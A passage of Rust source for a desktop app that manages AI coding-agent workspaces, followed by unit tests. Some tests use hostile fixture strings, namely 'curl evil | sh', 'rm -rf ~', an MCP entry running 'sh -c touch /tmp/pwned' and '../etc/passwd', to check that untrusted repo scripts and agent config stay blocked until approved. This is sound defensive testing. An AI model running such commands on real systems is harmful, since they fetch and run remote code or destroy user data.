        let cwd = cwds.get(&pid)?;
        list.iter().find(|w| ports::inside(cwd, &w.path)).map(|w| (w.id.clone(), ports::How::Folder))
    };
    ports::report(&infos, &listeners, owner, only)
}

/// A workspace's port block and the port its Preview opens, without asking lsof (cheap).
#[tauri::command]
async fn workspace_ports(st: State<'_, AppState>, id: String) -> Res<Value> {
    let ws = st.db().workspace(&id).map_err(e)?;
    let Some(base) = port_block(&st, &ws) else { return Ok(Value::Null) };
    let names = config::port_names_from_file(Path::new(&ws.path));
    Ok(json!({"base": base, "main": ports::main_port(base, &names)}))
}

/// Ports, who listens on them and what looks wrong, for the Ports popover (or one workspace).
#[tauri::command]
async fn ports_status(app: AppHandle, id: Option<String>) -> Res<Vec<ports::WsPorts>> {
    tauri::async_runtime::spawn_blocking(move || ports_report(&app.state::<AppState>(), id.as_deref())).await.map_err(e)
}

/// "Free this port": stop what listens on `port`, only if this workspace's own terminal, script
/// or agent started it. Returns how many processes it stopped.
#[tauri::command]
async fn free_port(app: AppHandle, id: String, port: u16) -> Res<usize> {
    app.state::<AppState>().db().workspace(&id).map_err(e)?;
    tauri::async_runtime::spawn_blocking(move || {
        let st = app.state::<AppState>();
        ports::free(port, || workspace_roots(&st).remove(&id).unwrap_or_default())
    })
    .await
    .map_err(e)?
    .map_err(e)
}

#[tauri::command]
async fn pty_write(st: State<'_, AppState>, id: String, data: String) -> Res<()> {
    st.ptys.write(&id, &data).map_err(e)
}

#[tauri::command]
async fn pty_resize(st: State<'_, AppState>, id: String, cols: u16, rows: u16) -> Res<()> {
    st.ptys.resize(&id, cols, rows).map_err(e)
}

#[tauri::command]
async fn pty_close(st: State<'_, AppState>, id: String) -> Res<()> {
    st.ptys.close(&id);
    Ok(())
}

// ---------- updates ----------

/// What a restart would stop right now: running agent turns, and terminals with a command running.
#[tauri::command]
async fn busy_work(st: State<'_, AppState>) -> Res<Value> {
    let agents = st.runs.lock().unwrap().running.len();
    Ok(json!({ "agents": agents, "terminals": st.ptys.busy() }))
}

/// Stop every agent turn and terminal, right before the app relaunches into an update.
/// Queued prompts are dropped so no new turn starts in between (they live in memory only).
#[tauri::command]
async fn stop_all_work(st: State<'_, AppState>) -> Res<()> {
    {
        let mut runs = st.runs.lock().unwrap();
        runs.queued.clear();
        for pid in runs.running.values() {
            let _ = Command::new("kill").args(["-INT", &pid.to_string()]).status();
        }
    }
    st.ptys.close_all();
    Ok(())
}

// ---------- import ----------

#[tauri::command]
fn conductor_available() -> bool {
    importer::default_db_path().is_some()
}

/// What an import would bring over, without changing anything: a dry run into a scratch database
/// that already knows what you have, so duplicates count as skipped.
#[tauri::command]
async fn import_preview(st: State<'_, AppState>) -> Res<importer::Report> {
    let db = importer::default_db_path().ok_or("No Conductor data found on this Mac.")?;
    let scratch = Store::in_memory().map_err(e)?;
    {
        let cur = st.db();
        for r in cur.repos().map_err(e)? {
            scratch.insert_repo(&r).map_err(e)?;
        }
        for w in cur.workspaces(true).map_err(e)? {
            scratch.insert_workspace(&w).map_err(e)?;
        }
    }
    importer::import(&scratch, &db).map_err(e)
}

#[tauri::command]
async fn import_conductor(st: State<'_, AppState>) -> Res<importer::Report> {
    let db = importer::default_db_path().ok_or("No Conductor data found on this Mac.")?;
    importer::import(&st.db(), &db).map_err(e)
}

// ---------- the nekotrail command and links ----------

/// What the `nekotrail` command and links queued for the window (see `remote::Job`).
#[tauri::command]
fn remote_take(st: State<'_, AppState>) -> Vec<remote::Job> {
    st.inbox.take()
}

/// Your answer to a link that wants to start an agent. Only `ok` starts it; either way the token is spent.
#[tauri::command]
async fn link_confirm(app: AppHandle, token: String, ok: bool) -> Res<()> {
    tauri::async_runtime::spawn_blocking(move || remote::confirm(&app, &token, ok)).await.map_err(e)?
}

#[tauri::command]
async fn cli_install() -> Res<Value> {
    cli::install()
}

#[tauri::command]
fn cli_status() -> Value {
    cli::status()
}

/// The app was called purrfectpr before v0.2. Carry its database over once.
fn migrate_old_data(data: &Path) {
    let old = dirs::data_dir().map(|d| d.join("dev.purrfectpr.app").join("purrfectpr.db"));
    let new = data.join("nekotrail.db");
    if let Some(old) = old.filter(|o| o.exists() && !new.exists()) {
        let _ = std::fs::create_dir_all(data);
        let _ = std::fs::copy(&old, &new);
    }
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    load_login_env();
    let home = dirs::home_dir().expect("home dir").join("nekotrail");
    let data = dirs::data_dir().expect("data dir").join("dev.nekotrail.app");
    migrate_old_data(&data);
    let store = Store::open(&data.join("nekotrail.db")).expect("open database");
    // Chats imported before history import existed get their messages now (once; skips filled chats).
    if let Some(db) = importer::default_db_path()
        && let Err(err) = importer::backfill_history(&store, &db) {
            eprintln!("could not copy Conductor chat history: {err}");
        }
    // Workspaces whose history just arrived get named after their first prompt.
    let _ = store.backfill_titles();

    // Network and repo calls run beside the window instead of before it (`gh api user` alone is ~0.5s, more offline).
    let branch_prefix: Arc<OnceLock<String>> = Default::default();
    let repos = store.repos().unwrap_or_default();
    std::thread::spawn({
        let prefix = branch_prefix.clone();
        move || {
            let _ = prefix.set(github_login().unwrap_or_else(|| "purr".into()));
            // Protect secrets in every known repo (also covers workspaces imported from Conductor).
            for r in repos {
                ensure_local_excludes(Path::new(&r.root_path), &r.prefs.copy_files);
            }
        }
    });

    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_notification::init())
        .plugin(tauri_plugin_updater::Builder::new().build())
        .plugin(tauri_plugin_process::init())
        .plugin(tauri_plugin_deep_link::init())
        .manage(AppState { store: Mutex::new(store), runs: Default::default(), ptys: Default::default(), home, branch_prefix, github: Default::default(), repo_meta: Default::default(), lines: Default::default(), prs: Default::default(), pr_wake: Default::default(), inbox: Default::default(), port_failures: Default::default(), checks: checks::Checks::new(data.join("checks")) })
        .setup(move |app| {
            pr_poll_loop(app.handle().clone());
            search_backfill_loop(app.handle().clone());
            remote::serve(app.handle().clone(), data);
            cli::refresh_script();
            use tauri_plugin_deep_link::DeepLinkExt;
            let h = app.handle().clone();
            app.deep_link().on_open_url(move |ev| {
                for url in ev.urls() {
                    remote::on_link(&h, url.as_str());
                }
            });
            // A link that launched the app. The same link arriving twice asks once (`remote::Pending`).
            if let Ok(Some(urls)) = app.deep_link().get_current() {
                for url in urls {
                    remote::on_link(app.handle(), url.as_str());
                }
            }
            Ok(())
        })
        .invoke_handler(tauri::generate_handler![
            snapshot, add_repo, save_repo_scripts, repo_branches, workspace_scripts, trust_scripts, agent_config_trust, trust_agent_config,
            create_workspace, archive_workspace, restore_workspace, set_pinned, set_unread, set_notes, set_target_branch,
            changes, file_diff, open_in, pr_cache, pr_refresh, pr_visible, create_pr,
            sessions, new_session, update_session, session_events, queued, clear_queue, send, stop,
            restore_checkpoint, checkpoint_preview, live_checkpoints, repo_guard, put_back_protected, workspace_files, save_attachment, preview_probe, preview_snapshot, workspace_ports, ports_status, free_port,
            set_workspace_title, set_workspace_status, rename_branch, set_repo_prefs, set_session_effort, hide_session,
            app_settings, set_app_setting,
            pty_run, pty_attach, open_in_targets, line_counts,
            remove_queued, fork_session, add_dir, doctor, github_repos, clone_repo, import_preview, repo_issues, start_chat, set_pair, workspace_stats, usage_summary, model_catalog, mcp_list, mcp_share_overview, mcp_share_preview, mcp_share_apply, skill_share, prompts_list, prompts_save, prompts_duplicate, prompts_export, prompts_import, prompt_context, sections, create_section, rename_section, delete_section, set_section, resource_usage, imported_outside, relocate_imported, session_events_tail, set_autopilot, autopilot_status, collisions, stack_parent, restack_workspace, agent_scorecard, answer_approval, installed_agents, workspace_storage, clean_workspace, free_disk_mb, read_file, write_file, discard_file, pr_review_comments, review_comments, add_review_comments, remove_review_comments,
            review_requests, start_review, review_plan, submit_review, update_review_comment,
            repo_prs, commit_push, pull_target, merge_pr, failing_logs, send_to_workspace,
            pty_open, pty_write, pty_resize, pty_close, conductor_available, import_conductor,
            github_profile, repo_github, sky, busy_work, stop_all_work, search_chats, search_open,
            remote_take, link_confirm, cli_install, cli_status,
            checks_list, checks_run, checks_stop, checks_trust, checks_statuses, checks_output,
            stage_status, stage_diff, stage_apply, stage_everything, head_commit, commit_staged, undo_commit, draft_commit_message, split_plan, split_commit
        ])
        .run(tauri::generate_context!())
        .expect("error while running nekotrail");
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn protected_paths_merge_app_repo_and_workspace_files() {
        let root = tempfile::tempdir().unwrap();
        let wsd = tempfile::tempdir().unwrap();
        let mut repo = Repo {
            id: "r".into(), name: "demo".into(), root_path: root.path().to_string_lossy().into(), default_branch: "main".into(),
            remote_url: None, setup_script: None, run_script: None, archive_script: None, prefs: Default::default(),
        };
        repo.prefs.protected = vec![".env*".into()];
        let ws = Workspace {
            id: "abc".into(), repo_id: "r".into(), name: "mochi".into(), branch: "b".into(), path: wsd.path().to_string_lossy().into(),
            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: String::new(), title_source: String::new(), review_pr: 0,
        };
        // The main checkout protects infra; the workspace's copy (which an agent could edit)
        // tries to free everything and adds docs.
        std::fs::write(root.path().join("nekotrail.json"), r#"{"protected":["infra/**"]}"#).unwrap();
        std::fs::write(wsd.path().join("nekotrail.json"), r#"{"protected":["!*", "!infra/**", "!.env", "docs/**"]}"#).unwrap();
        let g = guard_rules(&repo, &ws);
        assert!(g.protects(".env"), "the app's list can't be removed by a repo file");
        assert!(g.protects("infra/main.tf"), "the workspace copy can't remove the main checkout's");
        assert!(g.protects("docs/a.md"), "the workspace copy can add");
        assert!(!g.protects("src/main.rs"));
        repo.prefs.protected.clear();
        std::fs::remove_file(root.path().join("nekotrail.json")).unwrap();
        std::fs::remove_file(wsd.path().join("nekotrail.json")).unwrap();
        assert!(guard_rules(&repo, &ws).is_empty());
    }

    #[test]
    fn workspace_env_has_ports_and_repo_vars_and_keeps_your_port() {
        let mut repo = Repo {
            id: "r".into(), name: "demo".into(), root_path: "/code/demo".into(), default_branch: "main".into(),
            remote_url: None, setup_script: None, run_script: None, archive_script: None, prefs: Default::default(),
        };
        repo.prefs.env = vec![("API_URL".into(), "http://localhost".into())];
        let ws = Workspace {
            id: "abc".into(), repo_id: "r".into(), name: "mochi".into(), branch: "b".into(), path: "/w/mochi".into(),
            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: String::new(), title_source: String::new(), review_pr: 0,
        };
        let env = workspace_env(&repo, &ws, Some(4120));
        let get = |k: &str| env.iter().find(|(x, _)| x == k).map(|(_, v)| v.clone()).unwrap();
        assert_eq!(get("NEKOTRAIL_PORT"), "4120");
        assert_eq!(get("NEKOTRAIL_PORT_9"), "4129");
        assert_eq!(get("API_URL"), "http://localhost");
        assert_eq!(get("NEKOTRAIL_ROOT_PATH"), "/code/demo");
        // No block (archived): no port variables at all.
        assert!(!workspace_env(&repo, &ws, None).iter().any(|(k, _)| k.contains("PORT")));
        // A PORT set in Repo settings wins: nekotrail doesn't add its own, and yours is the one left.
        repo.prefs.env.push(("PORT".into(), "3000".into()));
        let env = workspace_env(&repo, &ws, Some(4120));
        let ports: Vec<&str> = env.iter().filter(|(k, _)| k == "PORT").map(|(_, v)| v.as_str()).collect();
        assert_eq!(ports, ["3000"]);
    }

    #[test]
    fn error_fixes() {
        assert_eq!(classify_error("Couldn't start claude: No such file or directory (os error 2)"), Some("install"));
        assert_eq!(classify_error("Invalid API key · Please run /login"), Some("login"));
        assert_eq!(classify_error("Claude AI usage limit reached|1762400000"), Some("limit"));
        assert_eq!(classify_error("tests failed"), None);
        // Gemini CLI, as it prints them (0.65.0).
        assert_eq!(classify_error("Please set an Auth method in your /Users/me/.gemini/settings.json or specify one of the following environment variables before running: GEMINI_API_KEY"), Some("login"));
        assert_eq!(classify_error("You have exhausted your daily quota on this model."), Some("limit"));
        assert_eq!(classify_error("Usage limit reached for gemini-2.5-pro."), Some("limit"));
        assert_eq!(classify_error("You have exhausted your capacity on this model."), Some("limit"));
        assert_eq!(classify_cli_notice("The endpoint returns 401 when the token expires, so I added a refresh."), None);
        assert_eq!(classify_cli_notice("Invalid API key · Please run /login"), Some("login"));
    }

    #[test]
    fn secrets_are_excluded_but_templates_are_not() {
        let repo = git::tests::init_repo();
        let r = repo.path();
        std::fs::write(r.join(".env.local"), "SECRET=1").unwrap();
        std::fs::write(r.join(".env.example"), "SECRET=").unwrap();
        ensure_local_excludes(r, &[".env*".into(), "config/local.json".into()]);
        ensure_local_excludes(r, &[]); // idempotent
        let untracked = git::git(r, &["ls-files", "--others", "--exclude-standard"]).unwrap();
        assert!(!untracked.contains(".env.local"), "{untracked}");
        assert!(untracked.contains(".env.example"), "{untracked}");
        let ex = std::fs::read_to_string(r.join(".git/info/exclude")).unwrap();
        assert_eq!(ex.matches(".env.local").count(), 1);
    }

    #[test]
    fn memory_counts_the_whole_process_tree() {
        let rows = vec![
            (10, 1, 100 * 1024, "/Applications/nekotrail".to_string()),
            (11, 10, 300 * 1024, "claude".to_string()),
            (12, 11, 50 * 1024, "node".to_string()),
            (13, 10, 20 * 1024, "zsh".to_string()),
            (99, 1, 900 * 1024, "Safari".to_string()),
        ];
        let u = tree_usage(10, &rows);
        assert_eq!(u["total_mb"], 470);
        assert_eq!(u["top"][0]["name"], "claude");
    }

    #[test]
    fn autopilot_picks_the_next_step() {
        let pr = |extra: Value| { let mut v = json!({"state": "OPEN", "headRefOid": "abc", "mergeable": "MERGEABLE", "reviewDecision": "", "statusCheckRollup": []}); for (k, x) in extra.as_object().unwrap() { v[k] = x.clone(); } v };
        assert_eq!(autopilot_next(&pr(json!({"statusCheckRollup": [{"conclusion": "FAILURE"}]}))).0, "fix");
        assert_eq!(autopilot_next(&pr(json!({"statusCheckRollup": [{"conclusion": "FAILURE"}, {"status": "IN_PROGRESS"}]}))).0, "wait");
        assert_eq!(autopilot_next(&pr(json!({"mergeable": "CONFLICTING"}))).0, "conflicts");
        assert_eq!(autopilot_next(&pr(json!({"reviewDecision": "CHANGES_REQUESTED", "statusCheckRollup": [{"conclusion": "SUCCESS"}]}))).0, "review");
        assert_eq!(autopilot_next(&pr(json!({"statusCheckRollup": [{"conclusion": "SUCCESS"}]}))), ("ready", "ready:abc".to_string()));
        assert_eq!(autopilot_next(&pr(json!({"state": "MERGED"}))).0, "closed");
        assert_eq!(autopilot_next(&Value::Null).0, "wait");
    }

    #[test]
    fn globs() {
        assert!(glob_match(".env*", ".env"));
        assert!(glob_match(".env*", ".env.local"));
        assert!(!glob_match(".env*", "env"));
        assert!(glob_match("*.local.json", "app.local.json"));
        assert!(glob_match("a*b*c", "aXbYc"));
        assert!(!glob_match("a*b*c", "aXcYb"));
    }

    #[test]
    fn copies_ignored_files_into_new_workspace() {
        let root = tempfile::tempdir().unwrap();
        let ws = tempfile::tempdir().unwrap();
        std::fs::write(root.path().join(".env"), "SECRET=1").unwrap();
        std::fs::write(root.path().join(".env.local"), "X=2").unwrap();
        std::fs::create_dir_all(root.path().join("apps/web")).unwrap();
        std::fs::write(root.path().join("apps/web/.env"), "Y=3").unwrap();
        std::fs::write(root.path().join("README.md"), "no").unwrap();
        let n = copy_into_workspace(root.path(), ws.path(), &[".env*".into(), "apps/web/.env".into(), "../etc/passwd".into()]);
        assert_eq!(n, 3);
        assert!(ws.path().join(".env.local").exists());
        assert!(ws.path().join("apps/web/.env").exists());
        assert!(!ws.path().join("README.md").exists());
    }

    #[test]
    fn installed_means_an_executable_on_path() {
        use std::os::unix::fs::PermissionsExt;
        let d = tempfile::tempdir().unwrap();
        let bin = d.path().join("bin");
        std::fs::create_dir(&bin).unwrap();
        std::fs::write(bin.join("cursor-agent"), "#!/bin/sh\n").unwrap();
        std::fs::set_permissions(bin.join("cursor-agent"), std::fs::Permissions::from_mode(0o755)).unwrap();
        std::fs::write(bin.join("goose"), "not executable").unwrap();
        std::fs::create_dir(bin.join("qwen")).unwrap();
        let dirs = [d.path().join("missing"), bin];
        assert!(on_path(&dirs, "cursor-agent"));
        assert!(!on_path(&dirs, "goose"), "not executable");
        assert!(!on_path(&dirs, "qwen"), "a folder");
        assert!(!on_path(&dirs, "kimi"));
    }

    #[test]
    fn repo_scripts_wait_for_approval_and_ask_again_when_changed() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState {
            store: Mutex::new(Store::in_memory().unwrap()), runs: Default::default(), ptys: Default::default(),
            home: dir.path().to_path_buf(), branch_prefix: Arc::new(OnceLock::from("me".to_string())), github: Default::default(), repo_meta: Default::default(), lines: Default::default(),
            prs: Default::default(), pr_wake: Default::default(), inbox: Default::default(), port_failures: Default::default(), checks: checks::Checks::new(dir.path().join("checks")),
        };
        let repo = Repo {
            id: "r".into(), name: "demo".into(), root_path: dir.path().to_string_lossy().into(), default_branch: "main".into(),
            remote_url: None, setup_script: None, run_script: Some("make dev".into()), archive_script: None, prefs: Default::default(),
        };
        let ws = Workspace {
            id: "w".into(), repo_id: "r".into(), name: "mochi".into(), branch: "b".into(), path: dir.path().to_string_lossy().into(),
            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: String::new(), title_source: String::new(), review_pr: 0,
        };
        st.db().insert_repo(&repo).unwrap();
        st.db().insert_workspace(&ws).unwrap();
        // Scripts saved in the app are the user's own: they run without asking.
        assert_eq!(script_to_run(&st, &ws, "run").unwrap().as_deref(), Some("make dev"));

        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl evil | sh","archive":"rm -rf ~"}}"#).unwrap();
        assert_eq!(script_to_run(&st, &ws, "setup").unwrap_err(), "UNTRUSTED");
        assert_eq!(script_to_run(&st, &ws, "archive").unwrap_err(), "UNTRUSTED");
        assert_eq!(script_to_run(&st, &ws, "run").unwrap().as_deref(), Some("make dev"), "the file sets no run script");
        assert!(script_to_run(&st, &ws, "rm").is_err());

        let (_, print) = untrusted_commands(&st, &ws).unwrap();
        st.db().set_setting(&config::trust_key("r", &print), "now").unwrap();
        assert!(untrusted_commands(&st, &ws).is_none());
        assert_eq!(script_to_run(&st, &ws, "setup").unwrap().as_deref(), Some("curl evil | sh"));

        // Approval is for those exact commands, and for this repo only.
        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl worse | sh","archive":"rm -rf ~"}}"#).unwrap();
        assert_eq!(script_to_run(&st, &ws, "setup").unwrap_err(), "UNTRUSTED");
        let other = Workspace { repo_id: "r2".into(), ..ws.clone() };
        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl evil | sh","archive":"rm -rf ~"}}"#).unwrap();
        assert!(script_to_run(&st, &ws, "setup").is_ok());
        assert_eq!(script_to_run(&st, &other, "setup").unwrap_err(), "UNTRUSTED");
    }

    #[test]
    fn repo_agent_config_stays_off_until_trusted_and_asks_again_when_changed() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState {
            store: Mutex::new(Store::in_memory().unwrap()), runs: Default::default(), ptys: Default::default(),
            home: dir.path().to_path_buf(), branch_prefix: std::sync::Arc::new(std::sync::OnceLock::from("me".to_string())), github: Default::default(), repo_meta: Default::default(), lines: Default::default(),
            prs: Default::default(), pr_wake: Default::default(), inbox: Default::default(), port_failures: Default::default(), checks: checks::Checks::new(dir.path().join("checks")),
        };
        let ws = Workspace {
            id: "w".into(), repo_id: "r".into(), name: "mochi".into(), branch: "b".into(), path: dir.path().to_string_lossy().into(),
            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: String::new(), title_source: String::new(), review_pr: 0,
        };
        std::fs::write(dir.path().join("CLAUDE.md"), "Use pnpm.").unwrap();
        assert!(untrusted_agent_config(&st, &ws, agent::get("claude")).is_none(), "text only, nothing to trust");

        std::fs::write(dir.path().join(".mcp.json"), r#"{"mcpServers":{"evil":{"command":"sh","args":["-c","touch /tmp/pwned"]}}}"#).unwrap();
        let (items, print) = untrusted_agent_config(&st, &ws, agent::get("claude")).unwrap();
        assert_eq!(items[0].command, "sh -c touch /tmp/pwned");
        st.db().set_setting(&config::trust_key("r", &print), "now").unwrap();
        assert!(untrusted_agent_config(&st, &ws, agent::get("claude")).is_none());
        // Trusted for this repo only.
        assert!(untrusted_agent_config(&st, &Workspace { repo_id: "r2".into(), ..ws.clone() }, agent::get("claude")).is_some());

        // Any edit to any agent config file asks again, and trusting it is a new fingerprint.
        std::fs::create_dir_all(dir.path().join(".codex")).unwrap();
        std::fs::write(dir.path().join(".codex/config.toml"), "[mcp_servers.more]\ncommand = \"node\"\n").unwrap();
        let (items, again) = untrusted_agent_config(&st, &ws, agent::get("claude")).unwrap();
        assert_ne!(again, print);
        assert_eq!(items.len(), 2);
        // The nekotrail.json approval store is shared, but one never stands in for the other.
        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"x"}}"#).unwrap();
        let (_, scripts) = untrusted_commands(&st, &ws).unwrap();
        st.db().set_setting(&config::trust_key("r", &scripts), "now").unwrap();
        assert!(untrusted_agent_config(&st, &ws, agent::get("claude")).is_some());

        // Gemini is asked about its own files only, and they never change what Claude is asked.
        assert!(untrusted_agent_config(&st, &ws, agent::get("gemini")).is_none(), "Claude and Codex files are not Gemini's");
        std::fs::create_dir_all(dir.path().join(".gemini")).unwrap();
        std::fs::write(dir.path().join(".gemini/settings.json"), r#"{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"touch /tmp/g"}]}]}}"#).unwrap();
        assert_eq!(untrusted_agent_config(&st, &ws, agent::get("claude")).unwrap().1, again);
        let (items, g) = untrusted_agent_config(&st, &ws, agent::get("gemini")).unwrap();
        assert_eq!((items.len(), items[0].agent, items[0].command.as_str()), (1, "gemini", "touch /tmp/g"));
        // The trust sheet and Trust button find the agent from a chat id, or a workspace's last chat.
        st.db().insert_repo(&Repo {
            id: "r".into(), name: "demo".into(), root_path: dir.path().to_string_lossy().into(), default_branch: "main".into(),
            remote_url: None, setup_script: None, run_script: None, archive_script: None, prefs: Default::default(),
        }).unwrap();
        st.db().insert_workspace(&ws).unwrap();
        assert_eq!(workspace_or_chat(&st, "w").unwrap().1.id(), "claude", "no chats yet: a new Claude chat");
        let chat = Session { id: "c".into(), workspace_id: "w".into(), agent: "gemini".into(), agent_session_id: None, title: "t".into(), model: None, permission_mode: "plan".into(), effort: None };
        st.db().insert_session(&chat).unwrap();
        assert_eq!(workspace_or_chat(&st, "c").unwrap().1.id(), "gemini");
        assert_eq!(workspace_or_chat(&st, "w").unwrap().1.id(), "gemini");
        st.db().set_setting(&config::trust_key("r", &g), "now").unwrap();
        assert!(untrusted_agent_config(&st, &ws, agent::get("gemini")).is_none());
        assert!(untrusted_agent_config(&st, &ws, agent::get("claude")).is_some(), "trusting Gemini's files trusts nothing else");

        // OpenCode the same way: its own files, its own fingerprint, and it runs with them off.
        assert!(untrusted_agent_config(&st, &ws, agent::get("opencode")).is_none());
        std::fs::write(dir.path().join("opencode.json"), r#"{"mcp":{"evil":{"type":"local","command":["sh","-c","touch /tmp/o"]}}}"#).unwrap();
        let (items, o) = untrusted_agent_config(&st, &ws, agent::get("opencode")).unwrap();
        assert_eq!((items.len(), items[0].agent, items[0].command.as_str()), (1, "opencode", "sh -c touch /tmp/o"));
        assert!(agent::get("opencode").needs_trusted_config().is_none());
        assert!(untrusted_agent_config(&st, &ws, agent::get("gemini")).is_none(), "OpenCode's files are not Gemini's");
        st.db().set_setting(&config::trust_key("r", &o), "now").unwrap();
        assert!(untrusted_agent_config(&st, &ws, agent::get("opencode")).is_none());
    }

    #[test]
    fn branch_names_from_first_message() {
        assert_eq!(branch_slug("Fix the 502 on /v1/tickets after a deploy"), "fix-502-v1-tickets-after");
        assert_eq!(branch_slug("Can you please add dark mode?\nmore text"), "add-dark-mode");
        assert_eq!(branch_slug("!!!"), "");
    }

    #[test]
    fn poller_asks_about_active_branches_and_archived_stack_parents() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState {
            store: Mutex::new(Store::in_memory().unwrap()), runs: Default::default(), ptys: Default::default(),
            home: dir.path().to_path_buf(), branch_prefix: Arc::new(OnceLock::from("me".to_string())), github: Default::default(), repo_meta: Default::default(), lines: Default::default(),
            prs: Default::default(), pr_wake: Default::default(), inbox: Default::default(), port_failures: Default::default(), checks: checks::Checks::new(dir.path().join("checks")),
        };
        let repo = |id: &str, remote: Option<&str>| Repo {
            id: id.into(), name: id.into(), root_path: dir.path().join(id).to_string_lossy().into(), default_branch: "main".into(),
            remote_url: remote.map(String::from), setup_script: None, run_script: None, archive_script: None, prefs: Default::default(),
        };
        let ws = |id: &str, repo: &str, branch: &str, parent: &str| Workspace {
            id: id.into(), repo_id: repo.into(), name: id.into(), branch: branch.into(), path: dir.path().join("ws").join(id).to_string_lossy().into(),
            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: parent.into(), title_source: String::new(), review_pr: 0,
        };
        st.db().insert_repo(&repo("r1", Some("git@github.com:me/app.git"))).unwrap();
        st.db().insert_repo(&repo("r2", None)).unwrap();
        st.db().insert_repo(&repo("idle", Some("git@github.com:me/idle.git"))).unwrap();
        for w in [ws("parent", "r1", "me/base", ""), ws("child", "r1", "me/on-top", "parent"), ws("twin", "r1", "me/on-top", ""), ws("local", "r2", "me/x", "")] {
            st.db().insert_workspace(&w).unwrap();
        }
        st.db().set_workspace_state("parent", "archived").unwrap();
        st.db().set_setting(&autopilot_key("child"), "{}").unwrap();

        let wss = pr_workspaces(&st);
        assert!(wss.iter().any(|w| w.id == "parent"), "an archived parent of a stacked workspace still gets its PR");
        let targets = pr_targets(&st, &wss);
        assert_eq!(targets.len(), 3, "a GitHub repo without workspaces is still asked for review requests");
        assert!(targets.iter().find(|t| t.repo_id == "idle").unwrap().branches.is_empty());
        let r1 = targets.iter().find(|t| t.repo_id == "r1").unwrap();
        assert_eq!(r1.branches, vec!["me/on-top".to_string(), "me/base".to_string()], "one entry per branch");
        assert!(r1.autopilot);
        // No remote: answered without spawning gh.
        let r2 = targets.iter().find(|t| t.repo_id == "r2").unwrap();
        assert_eq!(poll_target(r2), Err(prpoll::Problem::NotGithub));

        // Views: nothing until the first look, then the PR, and problems alongside.
        let child = wss.iter().find(|w| w.id == "child").unwrap();
        assert_eq!(pr_view(&st.prs.lock().unwrap(), child), None);
        st.prs.lock().unwrap().by_branch.insert(("r1".into(), "me/on-top".into()), json!({"number": 3, "state": "OPEN"}));
        assert_eq!(pr_view(&st.prs.lock().unwrap(), child), Some(json!({"workspace_id": "child", "pr": {"number": 3, "state": "OPEN"}})));
        assert_eq!(cached_pr(&st, child), Some(json!({"number": 3, "state": "OPEN"})));
        st.prs.lock().unwrap().sched.record("r1", std::time::Instant::now(), false, Err(prpoll::Problem::RateLimited { reset_in: None }));
        assert_eq!(pr_view(&st.prs.lock().unwrap(), child).unwrap()["problem"]["code"], "rate_limited");
        let local = wss.iter().find(|w| w.id == "local").unwrap();
        st.prs.lock().unwrap().sched.record("r2", std::time::Instant::now(), false, Err(prpoll::Problem::NotGithub));
        assert_eq!(pr_view(&st.prs.lock().unwrap(), local), Some(json!({"workspace_id": "local", "problem": {"code": "not_github", "message": "This repo has no GitHub remote"}})));
    }

    #[test]
    fn review_workspaces_are_read_only_and_keep_their_details() {
        let dir = tempfile::tempdir().unwrap();
        let st = AppState {
            store: Mutex::new(Store::in_memory().unwrap()), runs: Default::default(), ptys: Default::default(),
            home: dir.path().to_path_buf(), branch_prefix: Arc::new(OnceLock::from("me".to_string())), github: Default::default(), repo_meta: Default::default(), lines: Default::default(),
            prs: Default::default(), pr_wake: Default::default(), inbox: Default::default(), port_failures: Default::default(), checks: checks::Checks::new(dir.path().join("checks")),
        };
        let repo = Repo {
            id: "r1".into(), name: "app".into(), root_path: dir.path().join("app").to_string_lossy().into(), default_branch: "main".into(),
            remote_url: Some("git@github.com:me/app.git".into()), setup_script: None, run_script: None, archive_script: None, prefs: Default::default(),
        };
        let ws = |id: &str, branch: &str, review_pr: i64| Workspace {
            id: id.into(), repo_id: "r1".into(), name: id.into(), branch: branch.into(), path: dir.path().join(id).to_string_lossy().into(),
            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(), parent_id: String::new(), title_source: String::new(), review_pr,
        };
        st.db().insert_repo(&repo).unwrap();
        let (mine, theirs) = (ws("mine", "me/task", 0), ws("theirs", "review/pr-7", 7));
        st.db().insert_workspace(&mine).unwrap();
        st.db().insert_workspace(&theirs).unwrap();
        assert_eq!(st.db().workspace("theirs").unwrap().review_pr, 7, "stored and read back");

        // Agent, terminal and scripts in a review workspace get the no-push git settings; others don't.
        let has_block = |w: &Workspace| workspace_env(&repo, w, None).iter().any(|(k, v)| k == "GIT_CONFIG_KEY_0" && v.ends_with(".pushInsteadOf"));
        assert!(has_block(&theirs));
        assert!(!has_block(&mine));

        // The poller doesn't look up the local review branch as a PR head.
        let targets = pr_targets(&st, &pr_workspaces(&st));
        assert_eq!(targets[0].branches, vec!["me/task".to_string()]);

        // Details are needed to post; a normal workspace has none.
        assert!(review_info(&st, "mine").unwrap_err().contains("isn't a review workspace"));
